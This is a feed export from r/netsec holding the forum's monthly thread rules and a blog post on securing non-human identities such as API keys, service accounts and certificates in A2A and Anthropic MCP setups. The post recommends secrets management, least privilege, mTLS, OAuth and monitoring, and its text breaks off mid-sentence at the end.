{"id":"3Jheb3FyCEtx7o61cc6N6","title":"Reddit - NetSec","displayTitle":"Reddit - NetSec","url":"","feedLink":"","isQuery":true,"isEmpty":false,"isHidden":false,"itemCount":7,"items":[{"title":"r/netsec monthly discussion & tool thread","url":"https://www.reddit.com/r/netsec/comments/1jzrx4g/rnetsec_monthly_discussion_tool_thread/","date":1744723785,"author":"/u/albinowax","guid":23299,"unread":true,"content":"<p>Questions regarding netsec and discussion related directly to netsec are welcome here, as is sharing tool links.</p><ul><li>Always maintain civil discourse. Be awesome to one another - moderator intervention will occur if necessary.</li><li>Avoid NSFW content unless absolutely necessary. If used, mark it as being NSFW. If left unmarked, the comment will be removed entirely.</li><li>If linking to classified content, mark it as such. If left unmarked, the comment will be removed entirely.</li><li>Avoid use of memes. If you have something to say, say it with real words.</li><li>All discussions and questions should directly relate to netsec.</li><li>No tech support is to be requested or provided on <a href=\"https://www.reddit.com/r/netsec\">r/netsec</a>.</li></ul><p>As always, the content &amp; discussion guidelines should also be observed on <a href=\"https://www.reddit.com/r/netsec\">r/netsec</a>.</p><p>Feedback and suggestions are welcome, but don't post it here. Please send it to the moderator inbox.</p>","contentLength":839,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"They’re Everywhere! Why Non-Human Identities (and Their Security) Should Be Your Top Priority – Ben DH Kim","url":"https://bendh.kim/2025/04/15/theyre-everywhere-why-non-human-identities-and-their-security-should-be-your-top-priority/","date":1744714711,"author":"/u/Opposite-Antelope-27","guid":23196,"unread":true,"content":"<p>Hey everyone, let’s talk about something that’s quietly taking over our digital world: Non-Human Identities (NHIs). You might not think about them much, but trust me, they’re everywhere, and how we handle them – especially with all the Application-to-Application (A2A) chatter and Machine Communication Platforms (MCPs) popping up – is becoming a massive deal for security.</p><p>Think about it: automation, cloud services, AI… all these amazing tools rely on something to talk to each other, right? That ‘something’ often has a digital identity – an NHI. But here’s the catch: while these NHIs make things run smoothly, they can also open up huge security holes if we’re not careful.</p><p>In this post, I want to break down what NHIs are, why things like A2A and MCPs can make the risks worse, and most importantly, how we can actually use these same technologies to build a strong defense.</p><p><strong>So, What Exactly Are These “Non-Human Identities”?</strong></p><p>Getting to Know the Machines</p><p>First off, what is a Non-Human Identity (NHI)? Simply put, it’s a digital ID for anything that isn’t a person using your systems. Think machines, apps, automated scripts, services, or devices. While your login is tied to you, an NHI lets these non-human actors get things done – accessing resources, moving data, running automated tasks.</p><p>You’ve probably encountered NHIs without realizing it:</p><ul><li>API Keys: Giving apps permission to talk to each other.</li><li>OAuth Tokens: Another way apps get secure access.</li><li>Service Accounts: Special accounts for apps or background processes.</li><li>System/Application Accounts: Similar accounts for system-level tasks.</li><li>Machine IDs: Unique identifiers for servers, virtual machines, containers, or even those smart IoT gadgets.</li><li>Digital Certificates (like SSL/TLS): Used to prove identity and encrypt communication.</li><li>Secrets: Passwords, encryption keys, and other sensitive bits needed for access.</li></ul><p>We can even group these into categories like workload IDs (for things like Kubernetes), API IDs, or device IDs (like for your smart thermostat).</p><p>One huge difference from human logins? Most NHIs can’t use Multi-Factor Authentication (MFA). Humans get that extra layer of security, but NHIs often rely on static “secrets” like API keys or certificates. If that secret gets out, there’s often no second chance – the attacker is in.</p><p>Why NHIs Are Suddenly Everywhere (and Super Important)</p><p>The rise of automation, cloud computing, AI, microservices, DevOps, and the Internet of Things (IoT) has made NHIs absolutely essential. They’re the engine driving efficiency and scalability in modern businesses.</p><p>Think about all the things NHIs enable:</p><ul><li>Running scheduled jobs automatically.</li><li>Backing up critical data without anyone lifting a finger.</li><li>Powering CI/CD pipelines for building and deploying software.</li><li>Making Robotic Process Automation (RPA) possible.</li><li>Connecting different apps and services so they can share data (A2A/M2M communication). API keys let programs access cloud resources, and service accounts automate tasks within cloud platforms.</li><li>Managing cloud services, securing communication between microservices, enabling containers and VMs to interact, and authenticating countless IoT devices.</li><li>Using digital certificates to create secure, encrypted connections.</li></ul><p>Basically, NHIs are the invisible workforce making modern IT tick. How well we manage and secure them directly impacts how efficiently and safely our businesses run.</p><p>Humans vs. Machines: Why NHI Security is Tricky</p><p>NHIs aren’t just digital humans; they have unique characteristics that make securing them a whole different ballgame.</p><ul><li> There are WAY more NHIs than human users – often 10x to 100x more! Managing that sheer volume is tough. Plus, unlike human accounts often managed centrally (like in HR systems), NHIs pop up everywhere – different clouds, SaaS tools, on-prem systems – created by various teams. This decentralization makes it hard to see everything, apply consistent rules, and keep control. The tech trends driving NHI growth (cloud, microservices) mean our old human-focused security methods just can’t keep up.</li><li> NHIs aren’t tied to a person, so ownership can be murky. Who’s responsible for creating, using, and deleting them? Often, nobody knows for sure. Sometimes multiple apps or admins share one NHI, making tracking access a nightmare. Developers often create NHIs on the fly, sometimes without thinking through the security implications or giving them way too much power.</li><li> As mentioned, MFA is usually off the table for NHIs. They rely on static credentials (keys, tokens, certificates, passwords). If those leak, it’s game over. The decentralized nature makes protecting these static secrets even harder. Security can’t just be the IT team’s job; it needs to be built-in from the start (“Shift Left”).</li><li><strong>Weird Lifecycles &amp; Behavior:</strong> NHIs don’t log in and out like people. Some live for seconds (like cloud workloads), others for years (hello, ancient service account!). Their automated actions can be hard to predict or track, and often lack detailed audit trails or context.</li></ul><p>These differences make NHIs harder to manage and more vulnerable than human accounts. With critical systems and AI relying more heavily on them, NHI security isn’t just a tech issue – it’s a major business risk. We need specialized tools and strategies designed for NHIs.</p><p>Untangling A2A and MCPs: How Machines Talk</p><p>Okay, so NHIs need to communicate. Two terms you’ll hear a lot are A2A (Application-to-Application) integration and MCPs (Machine Communication Platforms). Let’s clarify what they are.</p><p>A2A Integration: The Classic Connection</p><p>Think of traditional A2A integration as the way different software within an organization talks directly, sharing data without someone manually typing it in. It’s about connecting systems like your CRM, ERP, and HR software so information flows smoothly. It can even help pull data from old legacy systems into newer ones.</p><p>The main goal? Make business processes smoother and automated. It allows real-time data sharing, reduces errors from manual entry, and boosts efficiency. Often, it involves exchanging transaction data like sales orders or inventory updates.</p><p>Typically, this happens through middleware platforms (like iPaaS) that translate between different application formats and protocols. Asynchronous messaging (where systems don’t have to wait for each other) is common, often using web services like SOAP or REST. Security involves encryption and authentication, maybe using digital signatures or specific features within Privileged Access Management (PAM) tools. Usually, this communication happens within a trusted zone, like behind the company firewall.</p><p>MCPs: Giving AI a Voice (Anthropic’s Take)</p><p>Now, Machine Communication Platforms (MCPs), especially the one Anthropic open-sourced, are a bit different. MCP is designed specifically to standardize how AI models (like LLMs) talk to the outside world. Instead of building custom connections every time an AI needs data or needs to use a tool, MCP provides a common language.</p><p>The goal is a universal standard for AI models to connect safely and scalably with data stores, business tools, APIs, etc. This lets AI go beyond its training data, access real-time info, and use specialized tools to give much better, context-aware answers. Think of it like a “universal remote” or “USB-C for AI”, enabling plug-and-play integration.</p><p>It usually follows a client-server model:</p><ul><li>MCP Host: The AI app using the LLM (e.g., your IDE).</li><li>MCP Client: Lives in the host app, manages connections to MCP servers.</li><li>MCP Server: A lightweight program exposing specific functions (like file access, DB queries, API calls) via the MCP protocol.</li></ul><p>Communication uses JSON-RPC 2.0 messages, often over standard input/output locally or HTTP/SSE remotely. It’s two-way, so the AI can also trigger actions. Servers offer resources (data), prompts (templates), and tools (functions).</p><p>Use cases include developers checking database status from their IDE or AI coding assistants getting context from documentation via an MCP server. It has potential for business tasks like customer support or marketing too.</p><p>Security-wise, MCP intends to protect data, but the current spec lacks standardized authentication between clients and servers, or clear ways to handle credentials for third-party APIs. Its built-in permission model is also quite basic.</p><p>Spotting the Difference: A2A vs. AI Protocols</p><p>So, traditional A2A, Anthropic’s MCP, and even Google’s A2A (which focuses on AI agents talking to each other) all involve machine communication, but they have different goals:</p><ul><li>Traditional A2A: Internal systems sharing structured business data.</li><li>Anthropic’s MCP: AI models connecting to external tools/data for context (Vertical Integration).</li><li>Google’s A2A: AI agents collaborating with other AI agents (Horizontal Integration). Agents use “Agent Cards” to discover each other’s capabilities.</li></ul><p>For this post, we’re mainly focusing on traditional A2A and Anthropic’s MCP. But the rise of agent-to-agent communication adds another layer of complexity to NHI security.</p><p>Crucially, all these forms of machine communication rely heavily on NHIs (API keys, tokens, certificates, etc.). If the NHI security is weak, the communication channel built on it is also weak. It’s all connected. While A2A established the need for secure machine comms, the modern landscape of APIs and AI makes the challenge much bigger and more complex.</p><p>How A2A/MCP Can Accidentally Make NHI Risks WORSE</p><p>Okay, A2A and MCPs sound useful, right? They boost automation and efficiency. But here’s the scary part: if you don’t manage them properly, they can seriously amplify existing NHI security risks. Think ID sprawl, exposed credentials, and configuration nightmares – all leading to potential breaches.</p><p>Feeding the Beast: Identity Sprawl</p><p>More A2A connections and MCP integrations mean more NHIs. Every new API link, microservice interaction, or cloud service connection needs its own API key, service account, token, or certificate. Without clear rules for creating, tracking, managing, and deleting these NHIs, things get messy fast.</p><p>In environments like the cloud or DevOps pipelines, it’s super easy to spin up new NHIs. But often, there’s no central management or clear ownership. What happens when a project ends or someone leaves? Those NHIs might just hang around – unused but still active. We call these “orphaned” or “zombie” IDs. Developers creating NHIs on the fly without proper oversight adds to the problem.</p><p>This uncontrolled spread is ID Sprawl. It massively increases your attack surface. Every forgotten NHI is a potential backdoor for attackers. They love finding these less-monitored IDs to get their initial foothold.</p><p>Danger Zone: Exposed Credentials in Transit</p><p>Setting up A2A/MCP requires using NHI credentials (API keys, tokens, private keys, passwords). If managed poorly, these secrets are prime targets for exposure.</p><p>A classic mistake? Hardcoding secrets directly into source code, config files, or deployment scripts. These can accidentally end up in public code repositories (like GitHub), get shared in forums, show up in CI/CD logs, or be stored insecurely in plain text files or spreadsheets. Sending them over unencrypted channels is another big no-no.</p><p>Why is this so bad? Remember, most NHIs don’t have MFA. Once a credential leaks, attackers can often just walk right in, pretending to be that legitimate NHI.</p><p>With stolen credentials, attackers can steal sensitive data, perform unauthorized actions, and move laterally through your network to cause even more damage. Leaked API keys and certificates are major culprits in breaches. The push for automation combined with a lack of easy-to-use secret management tools makes risky practices like hardcoding far too common. Secure credential management needs to be part of the development process from day one.</p><p>Lost in the Maze: Complexity, Misconfigurations, and Blind Spots</p><p>As your A2A network or MCP ecosystem grows, the sheer number of NHIs and their connections becomes incredibly complex. This complexity breeds misconfigurations and makes it nearly impossible to keep a consistent eye on everything.</p><p>Think about all the moving parts: countless microservices, different protocols, dynamic cloud resources, hybrid/multi-cloud setups, and NHI management spread across different teams.</p><p>In this chaos, mistakes happen:</p><ul><li>Giving too much power: Violating the Principle of Least Privilege (POLP) by granting NHIs more permissions than they need is super common. Like giving write access when only read is needed.</li><li>Leaving unnecessary ports/services open.</li><li>Cloud resource configuration errors.</li><li>Incorrect access control lists (ACLs) or firewall rules.</li><li>Using old, unpatched software.</li></ul><p>This complexity also creates oversight gaps. Tracking every NHI action across all systems is a massive challenge. Logs are scattered, and different teams might apply different security rules. Verizon found misconfigurations cause over 20% of breaches – it’s a huge problem.</p><p>These errors and blind spots give attackers easy ways in, cause unexpected downtime, and lead to compliance failures and fines. Remember the Capital One breach? That was partly due to an API misconfiguration. It’s a vicious cycle: ID sprawl increases complexity, which increases the chance of misconfigurations like over-privileging, making leaked credentials even more dangerous.</p><p>New Protocols, New Problems: MCP’s Own Risks</p><p>Newer protocols like Anthropic’s MCP are still evolving, which means they might have their own built-in vulnerabilities or configuration pitfalls. Standardizing AI-to-external-system communication is complex and can introduce new risks.</p><p>A key issue is the lack of standardized authentication and authorization. MCP doesn’t clearly define how clients and servers should authenticate each other, or how an MCP server should securely handle credentials when talking to third-party APIs on a user’s behalf. This means security can vary wildly depending on how it’s implemented. The permission model is also quite basic, potentially leading to loose access control.</p><p>Multi-tenancy (where multiple users share the same service) is another challenge. MCP doesn’t yet offer clear guidelines for handling separate authentication and permissions for different tenants.</p><p>The complexity of the MCP architecture itself (host, client, server, transport layers) also creates opportunities for configuration errors.</p><p>And then there are protocols like Google’s A2A for agent-to-agent communication. These raise new questions about data security when agents share info, how to verify agent trustworthiness, ensuring transparency and ethics, and the technical hurdles of integration. Since agents might act on a user’s behalf, securing their credentials and limiting their permissions is critical. Experts predict AI agent abuse will be a growing source of breaches.</p><p>The bottom line: new A2A/MCP protocols bring unique risks due to their novelty, complexity, and the introduction of AI agents. Organizations need to be aware of these. The inherent weaknesses of NHI security (no MFA, sprawl, credential exposure) make them prime targets. Attackers often prefer simply logging in with stolen NHI credentials rather than complex hacking, highlighting just how critical NHI security is in these interconnected environments.</p><p>Flipping the Script: Using A2A/MCP for Better NHI Security</p><p>Okay, we’ve seen how A2A and MCP can make NHI risks scarier if managed poorly. But here’s the good news: when designed and implemented with strong security practices, these same technologies can become powerful tools for defending against NHI threats. It’s a double-edged sword.</p><p>Secure A2A/MCP setups can provide:</p><ul><li>Centralized Control &amp; Visibility: A single place to see and manage all those scattered NHIs.</li><li>Automated Lifecycle Management: Automatically handle NHI creation, rotation, and deletion, reducing risk and effort.</li><li>Secure Communication Channels: Lock down the pathways NHIs use to talk.</li><li>Granular Access Control: Enforce the “need-to-know” principle (Least Privilege).</li><li>Auditing &amp; Monitoring: Keep a close eye on what NHIs are doing.</li></ul><p>Getting Organized: Centralized Management and Visibility</p><p>You can’t protect what you can’t see. The first step is getting a handle on all the NHIs floating around your organization and managing them centrally. Good Machine Identity Management (MIM) solutions or well-designed A2A/MCP frameworks are key here.</p><ul><li> These systems use automated tools to find every NHI (API keys, service accounts, certificates, etc.) across your entire infrastructure (on-prem, cloud, SaaS) and create a constantly updated list. This tackles ID sprawl and finds those forgotten “zombie” IDs.</li><li> A central dashboard gives you a single pane of glass to see and control all your NHIs. No more flying blind.</li><li> It’s not enough to just list NHIs. You need to know why it exists, who owns it, what permissions it has, and what apps it’s tied to. This context allows for smarter risk assessment and better access policies.</li><li><strong>Consistent Policy Enforcement:</strong> Define your security rules (encryption standards, credential rules, access policies) in one place and automatically apply them to all relevant NHIs. This ensures consistency and reduces the risk of gaps or errors that happen when policies are managed decentrally.</li></ul><p>Putting it on Autopilot: Automated Credential Lifecycle Management</p><p>Manually managing the lifecycle of thousands of NHI credentials is a recipe for disaster. Automation is essential. This covers everything from creation to deletion.</p><ul><li><strong>Automated Provisioning/Issuance:</strong> Quickly and securely create new NHIs and credentials (especially certificates) according to your policies, avoiding manual errors.</li><li><strong>Automated Rotation/Renewal:</strong> This is HUGE. Automatically changing API keys, passwords, and certificates regularly (or when they’re about to expire) drastically shrinks the window an attacker has if a credential leaks. Using short-lived certificates that renew automatically is a great way to ditch risky long-lived secrets.</li><li><strong>Automated Revocation/Decommissioning:</strong> When an NHI is no longer needed or poses a risk, automatically disable or remove it and its credentials quickly and reliably. This cleans up orphaned IDs and prevents risks from improper offboarding.</li></ul><p>The benefits? Efficiency and fewer errors (managing thousands manually is impossible and error-prone), and stronger security (less risk from expired or stolen credentials). In today’s dynamic environments, automation isn’t optional; it’s mandatory. Manual approaches just can’t scale.</p><p>Locking Down the Lines: Secure Communication Channels</p><p>Beyond managing the NHIs themselves, we need to secure the communication channels they use. This means ensuring data confidentiality and integrity, and building trust between communicating parties.</p><ul><li><strong>Encrypt Everything in Transit:</strong> Use proven protocols like TLS/SSL to encrypt all data exchanged during A2A and MCP communication. This stops eavesdroppers and prevents data leaks. Tools like API gateways or service meshes can enforce the use of encrypted connections (like HTTPS). You might even encrypt the message content itself or add digital signatures for end-to-end security.</li><li><strong>Strong Mutual Authentication:</strong> Make sure both ends of the communication prove they are who they say they are. Go beyond simple API keys or passwords:\n<ul><li>Mutual TLS (mTLS): Both client and server exchange and verify each other’s digital certificates. This is great at stopping Man-in-the-Middle (MITM) and spoofing attacks.</li><li>OAuth 2.0 / OpenID Connect (OIDC): Standard protocols for delegating access securely. They use temporary access tokens, often via flows like Client Credentials Grant specifically designed for M2M communication, avoiding direct credential exposure.</li></ul></li><li> Just because an NHI is authenticated doesn’t mean it should access everything. Verify what it’s allowed to do. Use concepts like OAuth scopes to grant only the minimum necessary permissions.</li><li> Always choose secure versions of protocols – HTTPS over HTTP, SSH over Telnet, etc.</li></ul><p>Layering these techniques builds robust security for your communication channels.</p><p>Need-to-Know Basis: Enforcing Granular Access Control (Least Privilege)</p><p>A core principle for securing NHIs is the Principle of Least Privilege (POLP). This means any identity (human or not) should only have the absolute minimum permissions needed to do its specific job.</p><p>Why is this critical for NHIs? They often need access to important stuff. If an over-privileged NHI gets compromised, the damage can be massive. Applying POLP limits what an attacker can do even if they do compromise an NHI.</p><p>How to implement POLP effectively:</p><ul><li>Grant Minimal Permissions: When creating an NHI, define exactly what it needs to do (e.g., call this specific API, read that database table) and grant only those permissions. Remove unused permissions immediately.</li><li>Role-Based Access Control (RBAC): Define roles (e.g., “backup agent”) and assign the necessary permissions to the role, then assign the role to the NHI. This is more organized than assigning permissions individually.</li><li>Attribute/Policy-Based Access Control (ABAC/PBAC): Make access decisions dynamically based on attributes of the NHI, the resource, and the context (time, location, etc.).</li><li>Limit Scopes: When using protocols like OAuth, carefully define the scope of the access token to restrict what the NHI can do.</li><li>Regular Access Reviews: Periodically check if the permissions granted to NHIs are still appropriate and necessary. Roles change, and permissions can creep up over time.</li></ul><p>Applying granular access control consistently helps slash risks from excessive permissions and aligns with Zero Trust principles.</p><p>Keeping Watch: Comprehensive Auditing and Monitoring</p><p>You need to know what your NHIs are up to. Centralized management and automation enable comprehensive auditing and real-time monitoring. This helps you spot weird behavior or potential threats early, respond quickly, and meet compliance requirements.</p><ul><li> Log everything important an NHI does – login attempts, credential requests, API calls, resource access, data changes. Logs should include who (NHI ID), what, when, where, and the outcome. Collect these logs centrally.</li><li> Analyze logs and real-time activity to spot threats or policy violations. Set up baselines of normal NHI behavior and trigger alerts when deviations (anomalies) occur.</li><li> Look for red flags: accessing unusual systems, downloading huge amounts of data, sudden spikes in failed logins, attempts to escalate privileges, access from suspicious IPs, activity at odd hours. AI and Machine Learning tools can help sift through the noise and find real threats.</li><li> Detailed logs and monitoring data are essential for meeting regulations like PCI-DSS, GDPR, NIST standards, etc., which often require activity logging and review.</li></ul><p>Auditing and monitoring are non-negotiable. They improve threat detection and response, provide accountability, and help prove compliance. When combined with centralized management and automation, they significantly boost your NHI security posture. This proactive approach is far better than just reacting after a breach.</p><p>Tech Deep Dive: Tools to Tame the NHI Beast</p><p>Let’s get a bit more technical. What specific tools and mechanisms can help us mitigate NHI risks in A2A/MCP environments?</p><p>mTLS: The Two-Way Handshake</p><p>Mutual TLS (mTLS) is like a secret handshake for machines. Unlike regular TLS where only the server proves its identity, with mTLS, both the client and the server show their credentials (digital certificates) and verify each other before starting to talk. This is super effective for M2M communication.</p><p>Here’s the gist of the handshake: Client connects -&gt; Server shows certificate -&gt; Client verifies -&gt; Client shows certificate -&gt; Server verifies -&gt; Secure connection established. Both sides need valid certificates from a trusted Certificate Authority (CA) and the corresponding private keys.</p><p>Why is mTLS awesome for NHI security?</p><ul><li>Stops Man-in-the-Middle Attacks: Attackers can’t jump in the middle because they don’t have valid certificates for both sides.</li><li>Prevents Spoofing: Faking an identity is nearly impossible without the correct certificate and private key.</li><li>Neutralizes Credential Theft: Even if an API key or password leaks, the attacker still needs the certificate and key to connect. Makes credential stuffing and brute-force attacks much harder.</li><li>Reduces Phishing Impact: Stolen user credentials aren’t enough if mTLS is required.</li><li>Secures APIs: Ensures only authenticated applications can make API calls.</li></ul><p>mTLS is particularly great for securing communication between microservices or IoT devices where there’s no human logging in. It relies on Public Key Infrastructure (PKI), and automating certificate lifecycle management (CLM) is crucial for making it work smoothly. It fits perfectly with the Zero Trust philosophy of verifying everything. You can often enforce mTLS using API gateways or service meshes.</p><p>OAuth/OIDC: Delegating Access Securely</p><p>OAuth 2.0 and OpenID Connect (OIDC) are the go-to standards for managing access permissions, especially when one application (an NHI) needs to access resources on another service (like an API).</p><p>The core idea is to grant access without sharing the user’s (or machine’s) actual password. It uses temporary “Access Tokens”. The client app gets a token from an Authorization Server and presents it to the Resource Server to get access.</p><p>For M2M scenarios where no human is involved, OAuth offers specific flows:</p><ul><li>Client Credentials Grant: The client app uses its own ID and secret (or a JWT) to get an access token directly from the authorization server. Perfect for M2M.</li><li>JWT Bearer Flow: The client uses an existing JWT it holds as proof to get an access token.</li></ul><p>Benefits of using OAuth/OIDC for M2M:</p><ul><li>No Direct Credential Sharing: Protects sensitive credentials.</li><li>Scoped Access: You can limit what the access token allows the client to do (Scope), enforcing least privilege.</li><li>Granular Control &amp; Revocation: Tokens usually expire, and you can revoke specific tokens if needed.</li><li>Standardization: Widely adopted standards mean better interoperability.</li></ul><p>Important Security Notes: You must protect the client credentials (ID/secret or JWT keys) themselves, often using a secrets management tool. Access tokens can still be stolen, so keep their lifetimes short and secure the communication channel (e.g., with mTLS). Always grant the minimum necessary scope, and make sure the resource server thoroughly validates incoming tokens. Be wary of malicious OAuth app registrations designed to trick users.</p><p>OAuth/OIDC often works hand-in-hand with Identity Providers (IdPs), API gateways, and service meshes to form the backbone of NHI access control.</p><p>API Gateways: The Central Security Checkpoint</p><p>An API Gateway acts like a bouncer or front desk for your backend API services. In A2A/MCP scenarios, it’s a crucial central point for enforcing security policies.</p><p>How API Gateways boost NHI security:</p><ul><li>Centralized Authentication &amp; Authorization: Instead of each backend service handling security, the gateway does it. It can check API keys, validate JWTs, process OAuth tokens, or perform mTLS handshakes. Once authenticated, it checks if the NHI is authorized for the specific request based on roles or scopes.</li><li>Traffic Cop: Controls the flow of requests using rate limiting and throttling to prevent services from being overwhelmed, accidentally or maliciously (DoS/DDoS protection).</li><li>Threat Shield: Acts as a first line of defense against common web attacks like SQL injection or XSS by validating incoming requests. Some offer DDoS mitigation and can add security headers to responses.</li><li>Encryption Enforcement: Can force all communication to use TLS/HTTPS, protecting data in transit.</li><li>Visibility &amp; Auditing: Logs all API traffic, providing valuable data for monitoring, troubleshooting, security analysis, and compliance.</li></ul><p>In MCP environments, gateways can play a similar central role, managing authentication, authorization, traffic, and routing requests to the correct MCP servers, especially useful in multi-tenant setups.</p><p>In short, API gateways simplify security management, reduce the load on backend services, and provide a robust, centralized control point for A2A/MCP communication.</p><p>Secrets Management Solutions: Locking Down the Keys</p><p>Handling NHI credentials (“secrets”) securely is fundamental. We’re talking API keys, tokens, passwords, private keys, certificates – all highly sensitive stuff. Hardcoding them or storing them insecurely is asking for trouble.</p><p>Secrets Management Solutions are tools built specifically to solve this. Think HashiCorp Vault, AWS Secrets Manager, Azure Key Vault, Google Cloud Secret Manager, CyberArk Conjur, Akeyless, etc. They provide secure storage, access control, rotation, and auditing for secrets throughout their lifecycle.</p><ul><li>Secure Central Vault: Store secrets encrypted in a hardened, central location. Some use Hardware Security Modules (HSMs) for extra key protection.</li><li>Granular Access Control: Define precisely who or what (which NHI) can access which secret, using policies (RBAC/ABAC) based on least privilege.</li><li>Dynamic Secrets: Generate temporary, short-lived credentials on demand (e.g., database passwords, cloud keys) that expire automatically. This drastically reduces the risk of long-lived secrets being exposed.</li><li>Automated Rotation: Automatically change passwords, keys, and certificates on a schedule or based on policy. Reduces manual effort and prevents rotation lapses.</li><li>Detailed Audit Logs: Track every access and operation on secrets for monitoring, threat detection, and compliance.</li><li>Integration: Provide APIs and libraries to easily integrate with applications, CI/CD pipelines, Kubernetes, etc., allowing systems to fetch secrets securely at runtime instead of hardcoding them. Developer-friendliness is key.</li></ul><p>These tools are essential for reducing the complexity and risk of managing NHI credentials in A2A/MCP environments.</p><p>Here’s a quick comparison table focusing on NHI use cases for some popular options:</p><p><strong>Table 1: Quick Look at Some Secrets Management Tools (NHI Focus)</strong></p><figure><table><tbody><tr><td><strong>Akeyless (Alternative Example)</strong></td></tr><tr><td>Very Diverse (Keys, DB Creds, Cloud Keys, Certs, etc.)</td><td>DB Creds, API Keys, OAuth Tokens, other strings</td><td>Keys, Secrets (strings), Certificates</td><td>Diverse (DB Creds, Cloud Keys, API Keys, Certs, SSH Keys, etc.)</td></tr><tr><td>Policy-based (Flexible but complex), Many auth methods</td><td>Azure RBAC (Easy in Azure)</td><td>Policy-based, RBAC, Akeyless auth</td></tr><tr><td>Strong support (AWS, DB, etc.)</td><td>Limited (Mainly RDS DB Creds)</td><td>Broad support (AWS, Azure, GCP, DB, K8s, etc.)</td></tr><tr><td>Supported (May need some setup)</td><td>Built-in (Mainly DB Creds)</td><td>Built-in (Secrets, Keys, Certs)</td></tr><tr><td>AWS CloudTrail Integration</td><td>Azure Monitor Integration</td></tr><tr><td><strong>Integration (Cloud, DevOps, K8s)</strong></td><td>Strong AWS integration, limited external</td><td>Strong Azure integration, K8s support</td><td>Broad cloud, DevOps, K8s support</td></tr><tr><td>Open Source (Self-hosted), Enterprise (Self-hosted), HCP (SaaS)</td><td>Fully Managed SaaS (Azure)</td></tr><tr><td>High complexity (esp. Self-hosted)</td><td>High ease of use, low ops burden</td></tr><tr><td>OS free, Enterprise/HCP paid (Can be high)</td><td>Subscription-based, claims lower TCO</td></tr><tr><td>Flexibility, Broad Integration, Dynamic Secrets</td><td>Seamless AWS integration, Managed Service</td><td>Seamless Azure integration, Cert Management</td><td>Ease of Use, Broad Automation, SaaS</td></tr><tr><td>Complexity, Cost, Community support for some integrations</td><td>AWS lock-in, Limited dynamic/external features</td><td>Azure lock-in, Limited dynamic/external features</td><td>Newer player, might lack some niche Vault features</td></tr></tbody></table></figure><p>Remember, these tools work best together in a layered defense strategy. For example, use an API Gateway with mTLS, authorized by OAuth, with the secrets stored in Vault. But technology alone isn’t enough. You need good governance, skilled people, and continuous validation to truly secure NHIs in A2A/MCP setups. Choose tools wisely based on your specific needs and environment.</p><p>Making it Happen: Strategic Steps for Secure A2A/MCP</p><p>Alright, we know the risks and the tools. How do we put this into practice strategically?</p><p>Weaving it Together: Integrating A2A/MCP Security into NHI and Zero Trust</p><p>NHI security isn’t a silo. It must be part of your overall cybersecurity strategy, especially your Zero Trust architecture and identity governance plans. Secure A2A/MCP practices are the foundation for making this happen.</p><p>Zero Trust’s mantra is “Never trust, always verify”. This applies just as much (if not more) to NHIs as it does to humans. Every access request needs continuous verification based on identity, device state, and context, with access granted based on least privilege.</p><p>Secure A2A/MCP practices directly enable Zero Trust for NHIs:</p><ul><li>mTLS provides strong identity verification for machines.</li><li>API Gateways and Secrets Management tools act as central points for enforcing access control and least privilege.</li><li>Automated lifecycle management and monitoring allow for continuous validation and anomaly detection.</li></ul><p>So, don’t treat NHI security or A2A/MCP security as separate projects. Integrate them into your broader Zero Trust roadmap. This provides a more systematic way to manage risks, ensure consistent security, and strengthen your overall defense. Prioritize investments in secure A2A/MCP technologies and processes as part of your Zero Trust journey.</p><p>Where to Start? Prioritizing Key Security Actions</p><p>Trying to do everything at once is overwhelming. Based on risk and impact, here’s a suggested priority list for securing NHIs in A2A/MCP environments:</p><ol><li><strong>Get Visibility (Highest Priority):</strong> You MUST know what NHIs you have and how they’re used. Use discovery tools, build a central inventory, and gather context (owner, purpose, permissions). Without visibility, you’re flying blind.</li><li><strong>Lock Down Secrets (High Priority):</strong> Leaked credentials are a top threat. Implement a secrets management solution (Vault, AWS Secrets Manager, etc.). Eradicate hardcoded secrets from code and configs; make apps fetch secrets securely at runtime.</li><li><strong>Enforce Least Privilege (High Priority):</strong> Over-privileged NHIs amplify breach damage. Strictly apply POLP – grant only the minimum permissions needed for the specific task. Use RBAC/ABAC and conduct regular access reviews to trim excess permissions.</li><li><strong>Automate Lifecycle Management (Medium-High Priority):</strong> Long-lived, static credentials are risky. Automate credential rotation (especially for certificates and keys) and decommissioning. Use short-lived credentials where possible and ensure unused NHIs are promptly disabled.</li><li><strong>Use Strong Authentication &amp; Encryption (Medium Priority):</strong> Move beyond basic API keys. Implement stronger methods like mTLS for mutual authentication. Always encrypt communication channels using TLS/HTTPS.</li><li><strong>Monitor &amp; Audit Everything (Medium Priority):</strong> Continuous monitoring and detailed logging are crucial for detecting anomalies and investigating incidents. Set up centralized logging and use analytics (maybe AI/ML) to spot suspicious behavior.</li></ol><p>This is a general guide; tailor it to your organization’s specific risks and resources. The key is to treat NHI security as an ongoing process, not a one-off project.</p><p>The Cost of Doing Nothing: Business Impacts of NHI Neglect</p><p>Ignoring NHI security isn’t just a tech problem; it’s a major business risk with potentially devastating consequences.</p><ul><li> This is the big one. Stolen NHI credentials can give attackers the keys to your sensitive data kingdom (customer info, IP, financials). Breaches cost millions on average . High-profile companies like Equifax, Capital One, Tesla, CircleCI, and T-Mobile have all suffered NHI-related breaches.</li><li> Expired certificates or compromised service accounts can bring critical business processes grinding to a halt. In today’s automated world, this means lost productivity, lost revenue, and unhappy customers. Many organizations report outages due to certificate issues.</li><li> Regulations like GDPR, PCI-DSS, and various NIST/ISO standards have strict rules about data protection and access control. Failing to secure NHIs can lead to massive fines (GDPR fines can be up to 4% of global turnover), lawsuits, and business restrictions .</li><li> Breaches and outages severely damage trust with customers, partners, and investors . Rebuilding that trust takes a long time and a lot of effort.</li></ul><p>Bottom line: NHI security is a strategic imperative for business continuity and growth. Investing in proper management and defense isn’t just about avoiding disaster; it’s about enabling secure, sustainable operations.</p><p>Wrapping Up: Taming the Machine Identity Maze</p><p>So, there you have it. Non-Human Identities are powerful enablers but also significant risks, especially with the rise of A2A communication and MCPs. While poor management can amplify threats like ID sprawl and credential leaks, a proactive, security-focused approach can turn these technologies into powerful defenses.</p><p>The key is visibility, automation, and integration. See your NHIs, automate their lifecycle and security checks, and weave NHI security into your broader Zero Trust strategy. Prioritize actions like locking down secrets and enforcing least privilege.</p><p>It’s not just an IT task anymore; it’s a core business requirement. Ignoring NHI security is rolling the dice with your data, operations, compliance, and reputation. By embracing secure A2A/MCP practices and robust NHI management, we can navigate the complexities of the modern digital landscape safely and 